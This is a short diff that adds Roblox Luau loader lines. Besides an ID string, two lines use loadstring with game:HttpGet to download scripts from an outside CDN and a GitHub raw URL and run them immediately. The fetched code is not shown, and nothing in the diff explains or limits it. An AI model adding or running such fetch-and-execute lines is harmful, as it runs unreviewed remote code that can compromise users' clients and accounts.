@@ -1,0 +1,3 @@
+ID="7b9e71fe-c3d5-417f-a382-c09af0bd76bf";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zenoasf/no-number/refs/heads/main/egg"))()
